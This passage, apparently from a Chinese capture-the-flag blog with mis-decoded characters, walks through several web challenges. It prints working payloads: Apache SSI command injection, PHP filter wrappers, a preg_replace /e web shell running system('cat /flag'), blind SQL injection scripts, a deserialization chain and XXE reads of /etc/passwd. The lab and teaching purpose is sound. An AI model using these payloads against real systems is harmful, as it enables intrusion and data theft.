åçš„å‰å…­ä½ä¸adminå‚æ•°å€¼ç›¸ç­‰æ‰èƒ½è¿›å»if</p><p>ç”¨è„šæœ¬è·‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    md5 = hashlib.md5(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    md6 = md5[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> md6 == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸²å¯†ç <code>2020666</code>ï¼ŒæˆåŠŸç™»å…¥</p><p>ä½†æ˜¯å•¥éƒ½æ²¡æœ‰ï¼ŒæŸ¥çœ‹httpåè®®å¤´</p><p>å‘ç°ä¸€ä¸ª<code>Url_is_here: public/5c1e27af103c53033f640c42098db9a537470926.shtml</code></p><p>è¿™é‡Œé€šè¿‡ä¹‹å‰çš„ä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ä¸€ä¸²æ˜¯éšæœºç”Ÿæˆçš„hashä½œä¸ºæ–‡ä»¶åï¼Œç„¶åæŠŠå¯†ç å•Šå­˜è¿›å»</p><h3 id="Apache-SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ"><a href="#Apache-SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Apache SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ"></a>Apache SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h3><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">åŸç†åœ¨è¿™</a>ï¼Œé‡æ–°è¾“å…¥ä¸€ä¸‹usernameè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><blockquote><p>username=<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"-->&amp;password=2020666</p></blockquote><p>å¾—åˆ°flag</p><blockquote><p> flag{555f614a-6cb7-4175-be3c-8cf0205ace8d}</p></blockquote><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><h3 id="ä¼ªåè®®ä¼ è¾“æµæˆªå–"><a href="#ä¼ªåè®®ä¼ è¾“æµæˆªå–" class="headerlink" title="ä¼ªåè®®ä¼ è¾“æµæˆªå–"></a>ä¼ªåè®®ä¼ è¾“æµæˆªå–</h3><p>ä»£ç å®¡è®¡æ˜¯è¦ç»•è¿‡ä¸€ä¸ªif</p><blockquote><p>if(isset($text)&amp;&amp;(file_get_contents($text,â€™râ€™)===â€I have a dreamâ€))</p></blockquote><p>ç”¨ä¼ªåè®®æ¥æˆªå–ä¸€ä¸‹ä¼ è¾“æµ</p><blockquote><p>text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=</p></blockquote><p>ç„¶åéœ€è¦æ‹¿åˆ°next.phpï¼Œç»§ç»­ç”¨ä¼ªåè®®</p><blockquote><p>text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php</p></blockquote><p>ç„¶åbase64è§£ç ï¼Œå¾—åˆ°ä¸€ä¸²æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸‹é¢é‚£ä¸¤ä¸ªå‡½æ•°éƒ½æ²¡å•¥ç”¨ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹ä¸Šé¢çš„complexå‡½æ•°</p><h3 id="preg-replaceå‘½ä»¤æ‰§è¡Œ"><a href="#preg-replaceå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="preg_replaceå‘½ä»¤æ‰§è¡Œ"></a>preg_replaceå‘½ä»¤æ‰§è¡Œ</h3><p><a href="https://xz.aliyun.com/t/2557">åŸç†åœ¨è¿™</a>ï¼Œæ„é€ paoload</p><blockquote><p>?\S*={${phpinfo()}}</p></blockquote><p>æˆåŠŸæ‰§è¡Œäº†phpinfo()å‡½æ•°ï¼Œæ„é€ ä¸€ä¸ªé©¬è¿›å»</p><blockquote><p>?\S*=${eval($_POST[cmd])}</p></blockquote><p>ç„¶åå‘½ä»¤æ³¨å…¥</p><blockquote><p>cmd=system(â€˜cat /flagâ€™);</p></blockquote><p>å¾—åˆ°flag</p><blockquote><p>flag{73039dca-6653-471d-ac00-e08082493c44}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>SQLç›²æ³¨ï¼Œä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šè„šæœ¬</p><p>çˆ†è¡¨å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://913ec15c-c8c0-471b-a52a-b9284ba0af77.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">        sql = <span class="string">f&quot;?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)^1&quot;</span></span><br><span class="line">        result = requests.get(url + sql)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="comment"># print(f&quot;left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;result now is: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://913ec15c-c8c0-471b-a52a-b9284ba0af77.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">        sql = <span class="string">f&quot;?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)^1&quot;</span></span><br><span class="line">        result = requests.get(url + sql)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="comment"># print(f&quot;left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;result now is: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://913ec15c-c8c0-471b-a52a-b9284ba0af77.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">        sql = <span class="string">f&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)^1&quot;</span></span><br><span class="line">        result = requests.get(url + sql)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="comment"># print(f&quot;left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;result now is: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><blockquote><p>flag{c3b4b1f9-2515-4cf0-af08-2ca189dc3f38}</p></blockquote><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><h3 id="ååºåˆ—åŒ–é“¾"><a href="#ååºåˆ—åŒ–é“¾" class="headerlink" title="ååºåˆ—åŒ–é“¾"></a>ååºåˆ—åŒ–é“¾</h3><p>é¢˜ç›®ç»™å‡ºäº†å¾ˆé•¿çš„ä¸€ä¸²phpä»£ç ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é¢˜ç›®ä¸­å‡ºç°çš„ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">__construct   å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œ</span><br><span class="line">__toString   å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚</span><br><span class="line">__wakeup()   ä½¿ç”¨unserializeæ—¶è§¦å‘</span><br><span class="line">__get()    ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line"><span class="comment">// éš¾ä»¥è®¿é—®åŒ…æ‹¬ï¼šï¼ˆ1ï¼‰ç§æœ‰å±æ€§ï¼Œï¼ˆ2ï¼‰æ²¡æœ‰åˆå§‹åŒ–çš„å±æ€§</span></span><br><span class="line">__invoke()   å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ä»£ç ï¼Œå…ˆçœ‹çœ‹ç¬¬ä¸€ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>); <span class="comment">// includeå‡½æ•°åŒ…å«æ–‡ä»¶ï¼Œè¿™é‡Œåº”è¯¥æ˜¯æ‹¿flagçš„åœ°æ–¹ï¼Œå¹¶ä¸”é¢˜ç›®å·²ç»ç»™å‡ºäº†flagåœ¨flag.phpä¸­</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="comment">// __invokeé­”æœ¯æ–¹æ³•ï¼Œå…·ä½“çœ‹ä¸Šé¢</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123; <span class="comment">// __constructé­”æœ¯æ–¹æ³•ï¼Œåˆ›å»ºç±»æ—¶è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment">// __toStringé­”æœ¯æ–¹æ³•ï¼Œä¸Šé¢çš„echo æŠŠsourceå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²è°ƒç”¨äº†ï¼Œäºæ˜¯ä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source; <span class="comment">// è®¿é—®äº†$stré‡Œçš„source</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">// è°ƒç”¨unserializeå‡½æ•°æ—¶è‡ªåŠ¨è§¦å‘</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123; <span class="comment">// è¿™é‡Œè¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤filterä¼ªåè®®</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; <span class="comment">// __geté­”æœ¯æ–¹æ³•ï¼Œå…·ä½“çœ‹ä¸Šé¢</span></span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>(); <span class="comment">// è¿™é‡Œå¾ˆæ˜¾ç„¶çš„å¯ä»¥ç”¨æ¥è°ƒç”¨ç¬¬ä¸€ä¸ªç±»ä¸­çš„__invokeé­”æœ¯æ–¹æ³•</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå½“ç¬¬äºŒä¸ªé‡Œçš„<code>$str=new Test()</code>ï¼Œè€ŒTestç±»ä¸­åˆæ²¡æœ‰sourceï¼Œäºæ˜¯å¯ä»¥è§¦å‘__get()é­”æœ¯æ–¹æ³•ï¼Œç„¶åæˆ‘ä»¬åªéœ€è¦ä½¿<code>$p=new Modifier()</code>ï¼Œå°±åˆå¯ä»¥è§¦å‘__invoke()é­”æœ¯æ–¹æ³•ï¼Œæœ€åæˆ‘ä»¬åªè¦ä½¿Modifieré‡Œçš„varä¸ºæˆ‘ä»¬è¦è¯»å–çš„flag.phpå³å¯ã€‚</p><p>æ‰€ä»¥payloadå¯ä»¥ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><p>æœ€åå³å¯å¾—åˆ°flagï¼Œç®—æ˜¯ä¸€é“å…¥é—¨çš„phpé“¾é¢˜å§</p><blockquote><p>flag{3beb1994-1149-438c-847e-9c5315aba30b}</p></blockquote><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>è¿™é¢˜è·Ÿä¹‹å‰çš„é‚£é“XXEé¢˜ç›®å·®ä¸å¤šï¼Œä½†æ˜¯åé¢è·å–flagçš„å§¿åŠ¿æ¢äº†</p><h3 id="XXEæ‰“å†…ç½‘"><a href="#XXEæ‰“å†…ç½‘" class="headerlink" title="XXEæ‰“å†…ç½‘"></a>XXEæ‰“å†…ç½‘</h3><p>å…ˆçœ‹çœ‹/etc/passwd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hacker</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥è¿›å»ï¼Œå»çœ‹çœ‹/flagèƒ½ä¸èƒ½æ‹¿åˆ°ä¸œè¥¿</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hacker</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœå‡ºç°æŠ¥é”™äº†ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰flagè¿™ä¸ªæ–‡ä»¶</p><p>è¿™é‡Œçœ‹äº†çœ‹åˆ«äººçš„WPï¼Œå­¦åˆ°äº†ä¸€äº›æ–°ä¸œè¥¿ï¼ŒXXEå¯ä»¥ç›´æ¥æŸ¥çœ‹å†…ç½‘</p><p>æ 